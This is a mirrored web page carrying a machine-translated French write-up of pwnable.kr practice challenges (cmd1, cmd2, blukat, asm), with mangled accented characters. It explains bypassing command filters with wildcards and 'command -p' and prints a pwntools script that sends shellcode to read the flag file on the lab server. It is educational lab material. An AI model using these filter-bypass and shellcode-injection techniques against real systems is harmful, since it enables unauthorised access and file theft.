<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üòå ‚úíÔ∏è üë©üèº‚Äçüíº Solution de la t√¢che avec pwnable.kr cmd1, cmd2, asm, blukat. Filtrage bypass sous Linux. √âcrire un shellcode avec pwntools üë©üèº‚ÄçüöÄ üññüèº ‚èÆÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans cet article, nous allons voir comment contourner un filtre l√©ger, comprendre comment √©crire un shell √† l'aide de pwntools et r√©soudre √©galement p...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Solution de la t√¢che avec pwnable.kr cmd1, cmd2, asm, blukat. Filtrage bypass sous Linux. √âcrire un shellcode avec pwntools</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/462091/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="image"></div><br>  Dans cet article, nous allons voir comment contourner un filtre l√©ger, comprendre comment √©crire un shell √† l'aide de pwntools et r√©soudre √©galement plusieurs t√¢ches √† partir du site <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">pwnable.kr</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Information organisationnelle</b> <div class="spoiler_text">  Surtout pour ceux qui veulent apprendre quelque chose de nouveau et se d√©velopper dans l'un des domaines de l'information et de la s√©curit√© informatique, j'√©crirai et parlerai des cat√©gories suivantes: <br><a name="habracut"></a><br><ul><li>  PWN; </li><li>  cryptographie (Crypto); </li><li>  technologies de r√©seau (r√©seau); </li><li>  reverse (Reverse Engineering); </li><li>  st√©ganographie (Stegano); </li><li>  recherche et exploitation des vuln√©rabilit√©s WEB. </li></ul><br>  En plus de cela, je partagerai mon exp√©rience en criminalistique informatique, analyse de logiciels malveillants et micrologiciels, attaques sur les r√©seaux sans fil et les r√©seaux locaux, r√©alisation de pentests et √©criture d'exploits. <br><br>  Afin que vous puissiez vous renseigner sur les nouveaux articles, logiciels et autres informations, j'ai cr√©√© une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">cha√Æne dans Telegram</a> et un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">groupe pour discuter de tout probl√®me</a> dans le domaine de l'ICD.  Aussi, je consid√©rerai personnellement vos demandes, questions, suggestions et recommandations <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">personnelles et r√©pondrai √† tout le monde</a> . <br><br>  Toutes les informations sont fournies √† des fins √©ducatives uniquement.  L'auteur de ce document n'assume aucune responsabilit√© pour tout dommage caus√© √† quelqu'un du fait de l'utilisation des connaissances et des m√©thodes obtenues √† la suite de l'√©tude de ce document. <br></div></div><br><h2>  Solution de la t√¢che cmd1 </h2><br>  Nous cliquons sur l'ic√¥ne avec la signature cmd1, et on nous dit que nous devons nous connecter via SSH avec le mot de passe guest. <br><cut></cut><br><img src="https://habrastorage.org/webt/tu/gv/me/tugvmexgvmtnmzupjc_h8klwkdq.png" alt="image"><br><br>  Une fois connect√©, nous voyons la banni√®re correspondante. <br><br><img src="https://habrastorage.org/webt/fi/kb/a3/fikba3jbl1c9uzcxk8mhslj6uc0.png" alt="image"><br><br>  Voyons quels fichiers se trouvent sur le serveur, ainsi que les droits dont nous disposons. <br><br><img src="https://habrastorage.org/webt/eq/om/tr/eqomtrq8hoba-ifoghtncv9pcxi.png" alt="image"><br><br>  Regardons le code source. <br><br><img src="https://habrastorage.org/webt/em/ah/1a/emah1ayzjaauh2ets8gojlrlnos.png" alt="image"><br><br>  Tout est tr√®s simple: on passe la commande au programme et il l'ex√©cute sur la ligne de commande, mais filtre d'abord les mots flag, sh, tmp.  Filtre le drapeau, mais pas le fla *. <br><br><img src="https://habrastorage.org/webt/9j/ij/g5/9jijg58zj6f_s1atdy-6ubftbmo.png" alt="image"><br><br>  Nous remettons le drapeau et obtenons un point de plus. <br><br><h2>  Solution de la t√¢che cmd2 </h2><br>  Nous cliquons sur l'ic√¥ne avec la signature cmd2, et on nous dit que nous devons nous connecter via SSH avec le mot de passe pour le travail cmd1. <br><br><img src="https://habrastorage.org/webt/gf/t_/gp/gft_gpnwn8qv5klamdsozbv_rzs.png" alt="image"><br><br>  Une fois connect√©, nous voyons la banni√®re correspondante. <br><br><img src="https://habrastorage.org/webt/kd/ab/ds/kdabdse5qdxwjail0vmdwqceo5a.png" alt="image"><br><br>  Voyons quels fichiers se trouvent sur le serveur, ainsi que les droits dont nous disposons. <br><br><img src="https://habrastorage.org/webt/zj/cc/63/zjcc63pmnnfbnoz6wygavgxhwxi.png" alt="image"><br><br>  Regardons le code source. <br><br><img src="https://habrastorage.org/webt/_p/dh/ek/_pdhek9e_luejcojnxtlyyvlrho.png" alt="image"><br><br>  Il ressemble √† cmd1, mais un filtre plus complexe.  Filtre √† nouveau le drapeau, mais ne filtre pas fla *.  Tout est compliqu√© par le filtrage slash, mais nous pouvons ex√©cuter / bin / cat en tant que commande -p cat. <br><br><img src="https://habrastorage.org/webt/xt/yg/tt/xtygttnufbouoleexfcnnjdmmde.png" alt="image"><br><br>  Nous remettons le drapeau et obtenons des points. <br><br><h2>  Solution d'emploi Blukat </h2><br>  Nous cliquons sur l'ic√¥ne avec la signature blukat, et on nous dit que nous devons nous connecter via SSH avec le mot de passe guest. <br><br><img src="https://habrastorage.org/webt/am/0e/vo/am0evoullonpkikqnkwxezmqzq8.png" alt="image"><br><br>  Une fois connect√©, nous voyons la banni√®re correspondante. <br><br><img src="https://habrastorage.org/webt/a4/v0/td/a4v0tdtshf_s3z01b0p7lkhggvw.png" alt="image"><br><br>  Voyons quels fichiers se trouvent sur le serveur, ainsi que les droits dont nous disposons. <br><br><img src="https://habrastorage.org/webt/qk/mm/7s/qkmm7szrfccqtdhnyx5eb3soonq.png" alt="image"><br><br>  Regardons le code source. <br><br><img src="https://habrastorage.org/webt/hv/un/le/hvunlegvl42pxs_7tix-0cglsgw.png" alt="image"><br><br>  Ainsi, un fichier avec un mot de passe est ouvert ici, se dispute avec la cl√© et affiche un drapeau.  Voici juste un fichier avec un mot de passe si vous lisez un fichier avec un mot de passe, il nous affiche le texte d'erreur.  En fait, l'erreur est le mot de passe ... Le fichier √©tant lisible par le groupe, nous sommes dans ce groupe. <br><br><img src="https://habrastorage.org/webt/if/bj/2_/ifbj2_blrsr33ttcjyxptao72ni.png" alt="image"><br><br><img src="https://habrastorage.org/webt/r-/rf/3k/r-rf3k-zwfmwxnyu73cz1edob7k.png" alt="image"><br><br>  Nous remettons le drapeau et obtenons trois points. <br><br><h2>  Asm job solution </h2><br>  Nous cliquons sur l'ic√¥ne avec la signature asm, et on nous dit que nous devons nous connecter via SSH avec le mot de passe guest. <br><br><img src="https://habrastorage.org/webt/ii/3c/uc/ii3cucqr3n2miiavye8fn_nhjbu.png" alt="image"><br><br>  Une fois connect√©, nous voyons la banni√®re correspondante. <br><br><img src="https://habrastorage.org/webt/vh/a5/zx/vha5zx0evigfpwbhbbhcoa86zxs.png" alt="image"><br><br>  Voyons quels fichiers se trouvent sur le serveur, ainsi que les droits dont nous disposons. <br><br><img src="https://habrastorage.org/webt/0y/xe/9c/0yxe9clbzsfkmmvxgicas4j2jwq.png" alt="image"><br><br>  Ils nous ont laiss√© un readme, lisez-le. <br><br><img src="https://habrastorage.org/webt/7z/h2/px/7zh2px4v9uy_nc2xic5irsapdrm.png" alt="image"><br><br>  Par cons√©quent, nous devons envoyer un shellcode qui lit le fichier indicateur au port 9026. <br><br><img src="https://habrastorage.org/webt/9r/ui/_-/9rui_-sln_ygf5b38z1zvatybn0.png" alt="image"><br><br>  Super.  Nous utilisons pwntools, nous d√©finissons des param√®tres de connexion et d'architecture. <br><br><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * r = remote(<span class="hljs-string"><span class="hljs-string">'pwnable.kr'</span></span>, <span class="hljs-number"><span class="hljs-number">9026</span></span>) context.arch = <span class="hljs-string"><span class="hljs-string">'amd64'</span></span> r.interactive()</code> </pre> <br>  Pour compiler le shell, nous utiliserons le module shellcraft.  Comment le shellcode fonctionnera: <br><br><ol><li>  Nous avons mis sur la pile une ligne - le nom du fichier. </li><li>  Ouvrez le fichier avec le nom en haut de la pile (registre rsp). </li><li>  Puisque la fonction open retournera le descripteur de fichier ouvert dans le registre rax - le premier param√®tre √† lire, nous lirons 64 octets sur la pile, donc le registre rsp sera le deuxi√®me param√®tre. </li><li>  Maintenant, nous √©crivons sur la sortie standard (descripteur 1) un drapeau qui se trouve au sommet de la pile (registre rsp). </li><li>  Nous r√©cup√©rons notre coquille et exp√©dions. </li></ol><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * r = remote(<span class="hljs-string"><span class="hljs-string">'pwnable.kr'</span></span>, <span class="hljs-number"><span class="hljs-number">9026</span></span>) context.arch = <span class="hljs-string"><span class="hljs-string">'amd64'</span></span> payload = shellcraft.pushstr(<span class="hljs-string"><span class="hljs-string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span></span>) payload += shellcraft.open(<span class="hljs-string"><span class="hljs-string">'rsp'</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) payload += shellcraft.read(<span class="hljs-string"><span class="hljs-string">'rax'</span></span>, <span class="hljs-string"><span class="hljs-string">'rsp'</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) payload += shellcraft.write(<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-string"><span class="hljs-string">'rsp'</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) shell = asm(payload) r.send(shell) r.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/kx/nj/kv/kxnjkvzyajdfyoyoqi5czvtpihq.png" alt="image"><br><br>  Nous remettons le drapeau et obtenons 6 points.  Rendez-vous dans le prochain article, o√π nous examinerons la vuln√©rabilit√© complexe Use After Free. <br><br>  Nous sommes dans un canal de t√©l√©gramme: un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">canal dans Telegram</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr462091/">https://habr.com/ru/post/fr462091/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr462073/index.html">Inconv√©nients du Proof-of-Stake standard ou comment nous avons choisi l'algorithme de recherche par consensus</a></li>
<li><a href="../fr462077/index.html">Un math√©maticien russe r√©fute l'hypoth√®se de 53 ans sur la coloration des r√©seaux</a></li>
<li><a href="../fr462081/index.html">Une histoire fascinante avec des photos: comment un site de service VPN est sorti deux fois d'un blocage ill√©gal</a></li>
<li><a href="../fr462083/index.html">Structures de donn√©es rapides avec des exemples. Premi√®re partie: liste cha√Æn√©e</a></li>
<li><a href="../fr462087/index.html">Test d'une femme de m√©nage intelligente (vodka, k√©fir, photos d'autres personnes)</a></li>
<li><a href="../fr462095/index.html">Travailler avec la lumi√®re et l'optique: comment d√©marrer une carri√®re √† l'universit√© - l'exp√©rience des dipl√¥m√©s de quatre programmes de ma√Ætrise sp√©cialis√©s</a></li>
<li><a href="../fr462097/index.html">Tour vert clair</a></li>
<li><a href="../fr462101/index.html">Rapport du Java Virtual Machine Language Summit 2019</a></li>
<li><a href="../fr462107/index.html">Marathon gratuit ¬´Big Data et super-h√©ros: votre premi√®re exp√©rience d'analyse de donn√©es¬ª</a></li>
<li><a href="../fr462109/index.html">Voir presque invisible, √©galement en couleur: une technique pour visualiser des objets √† travers un diffuseur</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>